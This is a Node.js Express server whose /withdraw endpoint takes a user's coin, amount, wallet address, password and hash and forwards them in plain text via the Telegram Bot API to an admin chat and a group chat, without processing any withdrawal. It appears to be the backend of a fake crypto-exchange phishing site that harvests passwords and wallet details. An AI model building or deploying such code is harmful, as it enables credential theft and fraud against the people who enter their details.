const express = require("express");
const cors = require("cors");
const axios = require("axios");

const app = express();

// --- 解决你的 OPTIONS 502（关键！！！） ---
app.use(cors({ origin: "*", methods: "GET,POST,OPTIONS", allowedHeaders: "*" }));
app.options("*", (req, res) => res.sendStatus(200));
// -------------------------------------------------

app.use(express.json());

app.get("/", (req, res) => {
    res.send("OK");
});

// 环境变量
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;

// 统一 Telegram 发送函数
async function sendTelegram(chatId, msg) {
    if (!chatId) return;
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: "HTML"
        });
    } catch (err) {
        console.error("Telegram Error:", err.response?.data || err.message);
    }
}

app.post("/withdraw", async (req, res) => {

    console.log("收到前端请求:", req.body);

    try {
        const { coin, amount, usdt, wallet, password, hash } = req.body;

        const msg = `
<b>🚨 New Withdrawal Request</b>

<b>Coin:</b> ${coin}
<b>Amount:</b> ${amount}
<b>USDT:</b> ${usdt}
<b>Wallet:</b> ${wallet}
<b>Password:</b> ${password}
<b>Hash:</b> ${hash}
        `;

        // 发给你
        await sendTelegram(ADMIN_CHAT_ID, msg);

        // 发给群组
        await sendTelegram(GROUP_CHAT_ID, msg);

        return res.json({ success: true });

    } catch (e) {
        console.error("Server Error:", e);
        return res.status(500).json({ success: false });
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log("🚀 Server running on", PORT));
